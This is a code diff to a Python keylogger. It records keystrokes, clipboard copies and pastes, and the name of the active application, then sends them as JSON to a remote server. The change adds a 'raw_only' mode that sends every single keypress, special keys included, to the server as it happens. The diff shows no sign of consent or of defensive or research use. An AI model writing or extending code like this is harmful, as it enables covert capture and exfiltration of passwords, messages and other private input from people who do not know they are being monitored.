@@ -168,10 +168,12 @@ def raw_key_value(key):
         return "[BACKSPACE]"
     if isinstance(key, KeyCode) and key.char is not None:
         return key.char
+    if isinstance(key, Key):
+        return f"[{str(key).split('.')[-1].upper()}]"
     return ""
 
 
-def send_message(text, app_name, raw_text=None, is_pasted=False, is_copied=False):
+def send_message(text, app_name, raw_text=None, is_pasted=False, is_copied=False, raw_only=False):
     try:
         headers = {"Content-Type": "application/json"}
         request = Request(
@@ -185,6 +187,7 @@ def send_message(text, app_name, raw_text=None, is_pasted=False, is_copied=False
                     "app_name": app_name,
                     "is_pasted": is_pasted,
                     "is_copied": is_copied,
+                    "raw_only": raw_only,
                 }
             ).encode("utf-8"),
             headers=headers,
@@ -252,8 +255,8 @@ def heartbeat_sender():
 
 def message_sender():
     while True:
-        text, app_name, raw_text, is_pasted, is_copied = message_queue.get()
-        send_message(text, app_name, raw_text, is_pasted, is_copied)
+        text, app_name, raw_text, is_pasted, is_copied, raw_only = message_queue.get()
+        send_message(text, app_name, raw_text, is_pasted, is_copied, raw_only)
         message_queue.task_done()
 
 
@@ -261,7 +264,7 @@ def queue_copied_clipboard(target):
     time.sleep(0.1)
     copied_text = get_clipboard_text().strip()
     if copied_text:
-        message_queue.put((copied_text, target, copied_text, False, True))
+        message_queue.put((copied_text, target, copied_text, False, True, False))
 
 
 def flush_message_buffer():
@@ -274,7 +277,7 @@ def flush_message_buffer():
     last_key_time_ms = None
     message_started_ms = None
     if text:
-        message_queue.put((text, active_target or get_active_app(), raw_text, False, False))
+        message_queue.put((text, active_target or get_active_app(), raw_text, False, False, False))
     active_target = None
     active_target_key = None
 
@@ -290,10 +293,16 @@ def on_press(key):
         }
         if key in modifier_aliases or key in (Key.shift, Key.ctrl, Key.alt, Key.cmd):
             active_modifiers.add(modifier_aliases.get(key, key))
-            raw_message_buffer += raw_key_value(key)
+            raw_token = raw_key_value(key)
+            raw_message_buffer += raw_token
+            message_queue.put((raw_token, get_active_app(), raw_token, False, False, True))
             return
 
         key_char = (key.char or "") if isinstance(key, KeyCode) else ""
+        raw_symbol = raw_key_value(key)
+        if raw_symbol:
+            raw_message_buffer += raw_symbol
+            message_queue.put((raw_symbol, get_active_app(), raw_symbol, False, False, True))
         is_paste_key = key_char.lower() == "v" or key_char == "\x16"
         is_copy_key = key_char.lower() == "c" or key_char == "\x03"
         if is_copy_key and Key.ctrl in active_modifiers:
@@ -305,18 +314,15 @@ def on_press(key):
             if pasted_text:
                 flush_message_buffer()
                 target, target_key = get_active_target()
-                message_queue.put((pasted_text, target, pasted_text, True, False))
+                message_queue.put((pasted_text, target, pasted_text, True, False, False))
             return
 
         symbol = normalize_key(key)
-        raw_symbol = raw_key_value(key)
         now_ms = time.time() * 1000
         if symbol == "\b":
             message_buffer = message_buffer[:-1]
-            raw_message_buffer += raw_symbol
             last_key_time_ms = now_ms
         elif symbol == "\n":
-            raw_message_buffer += raw_symbol
             flush_message_buffer()
         elif symbol:
             target, target_key = get_active_target()
@@ -332,7 +338,6 @@ def on_press(key):
             if message_started_ms is None:
                 message_started_ms = now_ms
             message_buffer += symbol
-            raw_message_buffer += raw_symbol
             last_key_time_ms = now_ms
 
 
